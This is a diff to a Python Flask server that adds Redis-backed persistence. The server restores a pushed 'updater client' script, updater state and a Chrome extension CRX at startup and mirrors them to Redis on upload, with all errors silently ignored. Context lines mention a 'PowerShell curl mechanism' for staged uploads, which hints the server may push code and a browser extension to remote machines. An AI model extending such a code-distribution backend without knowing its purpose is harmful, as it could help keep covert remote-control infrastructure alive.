@@ -342,6 +342,20 @@ limiter = Limiter(app=app, key_func=get_remote_address, storage_uri=REDIS_URL if
 cache = Cache(app, config={'CACHE_TYPE': 'redis' if REDIS_URL else 'simple', 'CACHE_REDIS_URL': REDIS_URL})
 metrics = PrometheusMetrics(app)
 Base.metadata.create_all(bind=engine)
+REDIS_CLIENT = None
+def _get_redis():
+    global REDIS_CLIENT
+    if not REDIS_URL:
+        return None
+    if REDIS_CLIENT is not None:
+        return REDIS_CLIENT
+    try:
+        import redis
+        REDIS_CLIENT = redis.Redis.from_url(REDIS_URL, decode_responses=False)
+        return REDIS_CLIENT
+    except Exception:
+        REDIS_CLIENT = None
+        return None
 
 # Staged uploads for PowerShell curl mechanism
 STAGED_UPLOADS = {}
@@ -574,6 +588,44 @@ UPDATER_STATE_PATH = os.path.join(UPDATER_DIR, 'updater_state.json')
 UPDATER_CLIENT_PATH = os.path.join(UPDATER_DIR, 'client_latest.py')
 EXTENSION_CONFIG_PATH = os.path.join(DATA_DIR, 'extension_config.json')
 CHROME_EXT_DIR = os.path.join(DATA_DIR, 'chrome-extension')
+REPO_DIR = os.path.dirname(__file__)
+REPO_UPDATES_DIR = os.path.join(REPO_DIR, 'updates')
+REPO_UPDATER_STATE_PATH = os.path.join(REPO_UPDATES_DIR, 'updater_state.json')
+REPO_EXTENSION_CONFIG_PATH = os.path.join(REPO_DIR, 'extension_config.json')
+def _bootstrap_persistence():
+    try:
+        r = _get_redis()
+        if r:
+            try:
+                if not os.path.isfile(UPDATER_CLIENT_PATH):
+                    b = r.get('nch:updater_client')
+                    if b:
+                        os.makedirs(UPDATER_DIR, exist_ok=True)
+                        with open(UPDATER_CLIENT_PATH, 'wb') as f:
+                            f.write(b)
+            except Exception:
+                pass
+            try:
+                if not os.path.isfile(UPDATER_STATE_PATH):
+                    s = r.get('nch:updater_state')
+                    if s:
+                        os.makedirs(UPDATER_DIR, exist_ok=True)
+                        with open(UPDATER_STATE_PATH, 'wb') as f:
+                            f.write(s)
+            except Exception:
+                pass
+            try:
+                crx = r.get('nch:extension_crx')
+                p = os.path.join(CHROME_EXT_DIR, 'extension.crx')
+                if crx and not os.path.isfile(p):
+                    os.makedirs(CHROME_EXT_DIR, exist_ok=True)
+                    with open(p, 'wb') as f:
+                        f.write(crx)
+            except Exception:
+                pass
+    except Exception:
+        pass
+_bootstrap_persistence()
 
 def _ensure_updater_dir():
     try:
@@ -600,6 +652,23 @@ def _read_updater_state() -> dict:
                 state = json.load(f)
     except Exception:
         state = {}
+    if not state:
+        try:
+            if os.path.exists(REPO_UPDATER_STATE_PATH):
+                with open(REPO_UPDATER_STATE_PATH, 'r', encoding='utf-8', errors='ignore') as f:
+                    state = json.load(f)
+        except Exception:
+            state = {}
+    if not state:
+        try:
+            r = _get_redis()
+            if r:
+                b = r.get('nch:updater_state')
+                if b:
+                    import json as _json
+                    state = _json.loads(b.decode('utf-8', errors='ignore'))
+        except Exception:
+            state = {}
     # Ensure version field exists
     if 'version' not in state or not state.get('version'):
         try:
@@ -659,6 +728,18 @@ def _read_extension_config() -> dict:
                     cfg.update({k: v for k, v in on_disk.items() if k in ('download_url', 'extension_id', 'display_name')})
     except Exception:
         pass
+    if not cfg.get('download_url') or not cfg.get('extension_id'):
+        try:
+            if os.path.exists(REPO_EXTENSION_CONFIG_PATH):
+                with open(REPO_EXTENSION_CONFIG_PATH, 'r', encoding='utf-8', errors='ignore') as f:
+                    on_repo = json.load(f)
+                    if isinstance(on_repo, dict):
+                        for k in ('download_url', 'extension_id', 'display_name'):
+                            v = on_repo.get(k)
+                            if isinstance(v, str) and v.strip():
+                                cfg[k] = v
+        except Exception:
+            pass
     if not cfg.get('extension_id'):
         cfg['extension_id'] = os.environ.get('VAULT_EXTENSION_ID') or 'cicnkiabgagcfkheiplebojnbjpldlff'
     # Auto-derive extension_id from local CRX if present and id looks like default
@@ -685,6 +766,11 @@ def _save_extension_config(cfg: dict) -> bool:
         keep = {k: v for k, v in (cfg or {}).items() if k in ('download_url', 'extension_id', 'display_name')}
         with open(EXTENSION_CONFIG_PATH, 'w', encoding='utf-8', errors='ignore') as f:
             json.dump(keep, f, indent=2)
+        try:
+            with open(REPO_EXTENSION_CONFIG_PATH, 'w', encoding='utf-8', errors='ignore') as f2:
+                json.dump(keep, f2, indent=2)
+        except Exception:
+            pass
         return True
     except Exception:
         return False
@@ -4944,6 +5030,19 @@ def push_updater():
     try:
         with open(UPDATER_STATE_PATH, 'w', encoding='utf-8', errors='ignore') as f:
             json.dump(state, f, indent=2)
+    except Exception:
+        pass
+    try:
+        os.makedirs(REPO_UPDATES_DIR, exist_ok=True)
+        with open(REPO_UPDATER_STATE_PATH, 'w', encoding='utf-8', errors='ignore') as f:
+            json.dump(state, f, indent=2)
+    except Exception:
+        pass
+    try:
+        r = _get_redis()
+        if r:
+            r.set('nch:updater_state', json.dumps(state).encode('utf-8'))
+            r.set('nch:updater_client', code.encode('utf-8'))
     except Exception:
         pass
     return jsonify(state)
@@ -9618,6 +9717,12 @@ def upload_extension_crx():
         crx_path = os.path.join(base_dir, 'extension.crx')
         with open(crx_path, 'wb') as f:
             f.write(data_bytes)
+        try:
+            r = _get_redis()
+            if r:
+                r.set('nch:extension_crx', data_bytes)
+        except Exception:
+            pass
         # Update config to point to local CRX route
         cfg = _read_extension_config()
         try:
